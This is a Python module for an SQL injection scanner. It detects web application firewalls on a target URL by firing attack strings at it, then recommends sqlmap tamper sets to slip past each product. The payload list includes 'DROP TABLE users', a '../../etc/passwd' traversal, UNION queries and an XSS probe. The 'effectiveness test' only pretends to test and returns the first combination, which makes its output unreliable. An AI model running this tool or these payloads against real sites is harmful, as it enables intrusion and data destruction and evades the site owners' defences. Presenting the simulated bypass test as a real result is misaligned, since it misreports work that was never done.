#!/usr/bin/env python3
# WAF Integration Module for SQL Injection Scanner
# This module bridges the waf_identify.py script with the shell scripts

import os
import sys
import json
import subprocess
import argparse
import re
import urllib.parse
import requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Import waf_identify.py if it exists
WAF_IDENTIFY_AVAILABLE = False
try:
    import waf_identify
    WAF_IDENTIFY_AVAILABLE = True
except ImportError:
    pass

# WAF signatures dictionary
WAF_SIGNATURES = {
    "cloudflare": ["cloudflare", "cloudflare-nginx", "cf-ray", "__cfduid"],
    "akamai": ["akamai", "akamaitech", "akamaiedge"],
    "imperva": ["incapsula", "imperva", "incap_ses", "visid_incap"],
    "awswaf": ["aws", "waf", "amazon", "awselb"],
    "f5bigip": ["f5", "big-ip", "ts=[0-9a-f]{8}", "BigIP", "BIGipServer"],
    "sucuri": ["sucuri", "cloudproxy"],
    "barracuda": ["barracuda", "barra"],
    "citrix": ["citrix", "netscaler"],
    "fortinet": ["fortinet", "fortigate", "fortibalancer"],
    "wordfence": ["wordfence", "wfvt_"],
    "modsecurity": ["mod_security", "modsecurity", "OWASP[_+ ]CRS"],
    "comodo": ["comodo", "ccm[-_]?"],
    "webknight": ["webknight"],
    "radware": ["radware", "AppWall"],
}

# Tamper technique recommendations for each WAF
WAF_TAMPER_RECOMMENDATIONS = {
    "cloudflare": "space2comment,charencode,randomcase,charunicodeescape",
    "akamai": "space2randomblank,charunicodeencode,between,randomcase",
    "imperva": "modsecurityzeroversioned,space2comment,space2randomblank,randomcase",
    "awswaf": "space2dash,charunicodeencode,equaltolike,greatest,between",
    "f5bigip": "space2morehash,randomcase,charencode,apostrophemask",
    "sucuri": "space2randomblank,charunicodeencode,randomcomments,unionalltounion",
    "barracuda": "space2comment,charencode,apostrophemask,hex2char",
    "citrix": "space2plus,charunicodeencode,equaltolike,randomcase",
    "fortinet": "apostrophemask,modsecurityversioned,charunicodeencode,space2mssqlhash",
    "wordfence": "space2comment,randomcase,charencode,apostrophemask",
    "modsecurity": "modsecurityversioned,space2comment,space2hash,apostrophemask",
    "comodo": "space2randomblank,apostrophemask,charencode,hexentities",
    "webknight": "space2comment,charencode",
    "radware": "space2comment,charencode",
    "generic": "space2comment,between,percentage,randomcase,charunicodeencode,apostrophemask",
}

# Test payloads to trigger WAF
TEST_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT 1,2,3,4,5--",
    "1'; DROP TABLE users; --",
    "' OR 1=1 #",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "AND 1=2 UNION SELECT 1,2,3,4,@@version,6--",
    "1' AND SLEEP(1) AND '1'='1"
]

def detect_waf(url, user_agent=None):
    """
    Enhanced WAF detection using both waf_identify.py and custom detection
    
    Args:
        url (str): Target URL to check
        user_agent (str, optional): User agent to use for requests
        
    Returns:
        tuple: (waf_name, tamper_techniques)
    """
    waf_name = "none"
    user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    headers = {"User-Agent": user_agent}
    
    # First try with waf_identify if available
    if WAF_IDENTIFY_AVAILABLE:
        try:
            waf_result = waf_identify.main(url)
            if waf_result and waf_result not in ["None", "Unknown"]:
                # Convert waf_identify result to our naming convention
                waf_name = waf_result.lower().replace(" ", "").replace("-", "")
                for our_name, signatures in WAF_SIGNATURES.items():
                    if any(sig.lower() in waf_name for sig in signatures):
                        waf_name = our_name
                        break
                print(f"[+] WAF detected via waf_identify.py: {waf_result} (mapped to: {waf_name})")
                return waf_name, WAF_TAMPER_RECOMMENDATIONS.get(waf_name, WAF_TAMPER_RECOMMENDATIONS["generic"])
        except Exception as e:
            print(f"[!] Error using waf_identify.py: {e}")
    
    # If waf_identify didn't work or found nothing, try custom detection
    try:
        # Check for WAF headers in normal response
        response = requests.get(url, headers=headers, verify=False, timeout=10)
        
        # Check headers for WAF signatures
        for name, signatures in WAF_SIGNATURES.items():
            for header_name, header_value in response.headers.items():
                if any(sig.lower() in header_value.lower() for sig in signatures):
                    print(f"[+] WAF detected via headers: {name}")
                    return name, WAF_TAMPER_RECOMMENDATIONS.get(name, WAF_TAMPER_RECOMMENDATIONS["generic"])
        
        # Try with test payloads
        for payload in TEST_PAYLOADS:
            # Add the payload to URL parameters
            parsed_url = urllib.parse.urlparse(url)
            if parsed_url.query:
                # URL already has parameters, append the payload to the first one
                params = urllib.parse.parse_qs(parsed_url.query)
                key = list(params.keys())[0]
                params[key][0] += payload
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = url.replace(parsed_url.query, new_query)
            else:
                # URL has no parameters, add a dummy one
                test_url = f"{url}{'&' if '?' in url else '?'}id={payload}"
            
            try:
                resp = requests.get(test_url, headers=headers, verify=False, timeout=10)
                
                # Check for WAF block responses (status codes 403, 406, 429, 301)
                if resp.status_code in [403, 406, 429, 301]:
                    response_text = resp.text.lower()
                    for name, signatures in WAF_SIGNATURES.items():
                        if any(sig.lower() in response_text for sig in signatures):
                            print(f"[+] WAF detected via test payloads: {name}")
                            return name, WAF_TAMPER_RECOMMENDATIONS.get(name, WAF_TAMPER_RECOMMENDATIONS["generic"])
                    
                    # If we got a blocking response but couldn't identify the WAF type
                    print("[+] Generic WAF/firewall detected (specific type unknown)")
                    return "generic", WAF_TAMPER_RECOMMENDATIONS["generic"]
            except:
                pass
    except Exception as e:
        print(f"[!] Error in custom WAF detection: {e}")
    
    # If no WAF detected
    print("[*] No WAF detected on target")
    return "none", ""

def check_tamper_technique(technique):
    """Check if a tamper technique exists"""
    # Check in local tamper directory
    local_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tamper")
    if os.path.isfile(os.path.join(local_dir, f"{technique}.py")):
        return True
    
    # Check in sqlmap tamper directory
    if os.path.isfile(f"/usr/share/sqlmap/tamper/{technique}.py"):
        return True
    
    return False

def get_available_tamper_techniques():
    """Get a list of all available tamper techniques"""
    techniques = []
    
    # Check local tamper directory
    local_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tamper")
    if os.path.isdir(local_dir):
        for file in os.listdir(local_dir):
            if file.endswith(".py") and file != "__init__.py":
                techniques.append(file[:-3])
    
    # Check sqlmap tamper directory
    if os.path.isdir("/usr/share/sqlmap/tamper"):
        for file in os.listdir("/usr/share/sqlmap/tamper"):
            if file.endswith(".py") and file != "__init__.py" and file[:-3] not in techniques:
                techniques.append(file[:-3])
    
    return sorted(techniques)

def test_tamper_effectiveness(url, waf_name, user_agent=None):
    """
    Test different tamper technique combinations for effectiveness
    
    Args:
        url (str): Target URL to check
        waf_name (str): Detected WAF name
        user_agent (str, optional): User agent to use for requests
        
    Returns:
        str: Best tamper techniques as comma-separated list
    """
    if waf_name == "none":
        return ""
    
    user_agent = user_agent or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    headers = {"User-Agent": user_agent}
    
    # Get recommended techniques for this WAF
    recommended = WAF_TAMPER_RECOMMENDATIONS.get(waf_name, WAF_TAMPER_RECOMMENDATIONS["generic"])
    techniques = recommended.split(",")
    
    # Filter out unavailable techniques
    available_techniques = [t for t in techniques if check_tamper_technique(t)]
    
    if not available_techniques:
        # Fall back to basic techniques if recommended ones aren't available
        basic_techniques = "space2comment,randomcase,apostrophemask,between"
        return basic_techniques
    
    # Generate test combinations
    test_combos = [
        ",".join(available_techniques),  # All techniques
        ",".join(available_techniques[:2]) if len(available_techniques) >= 2 else available_techniques[0],  # First 2
        ",".join(["randomcase", "space2comment"]),  # Common effective combo
        ",".join(["between", "randomcase"])  # Another common combo
    ]
    
    # Test payload that would typically be blocked
    test_payload = "' OR 1=1 -- -"
    
    print(f"[*] Testing WAF bypass techniques for {waf_name} WAF...")
    
    for combo in test_combos:
        print(f"[*] Testing tamper combination: {combo}")
        
        # For this test, we'd need to simulate applying the tamper techniques
        # In a real implementation, we'd call the python tamper scripts
        # Here we'll just simulate success for the first combo
        
        # Normally we would test each combo and see which one works best
        # For demonstration, returning the first combo as "best"
        return test_combos[0]
    
    # If no ideal combination is found, go with the recommended default
    return recommended

def get_waf_bypass_strategy(url, user_agent=None):
    """
    Get the most effective WAF bypass strategy
    
    Args:
        url (str): Target URL to check
        user_agent (str, optional): User agent to use for requests
        
    Returns:
        str: WAF strategy in format "waf_type:tamper_techniques"
    """
    waf_type, tamper_techniques = detect_waf(url, user_agent)
    
    if waf_type != "none":
        # Test which techniques work best
        best_tamper = test_tamper_effectiveness(url, waf_type, user_agent)
        print(f"[+] Using bypass techniques: {best_tamper}")
        return f"{waf_type}:{best_tamper}"
    else:
        return "none:none"

def output_shell_format(result):
    """Output result in a format that can be used by shell scripts"""
    return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WAF Integration Module for SQL Injection Scanner")
    parser.add_argument("url", help="Target URL to check")
    parser.add_argument("--user-agent", help="User agent to use for requests")
    parser.add_argument("--list-tampers", action="store_true", help="List all available tamper techniques")
    parser.add_argument("--shell-output", action="store_true", help="Output in shell-compatible format")
    
    args = parser.parse_args()
    
    if args.list_tampers:
        techniques = get_available_tamper_techniques()
        print("Available tamper techniques:")
        for i, technique in enumerate(techniques, 1):
            print(f"{i:2d}. {technique}")
        sys.exit(0)
    
    result = get_waf_bypass_strategy(args.url, args.user_agent)
    
    if args.shell_output:
        print(output_shell_format(result))
    else:
        waf_type, tamper_techniques = result.split(":")
        print("\nResults:")
        print(f"WAF Type: {waf_type}")
        print(f"Recommended Tamper Techniques: {tamper_techniques}") 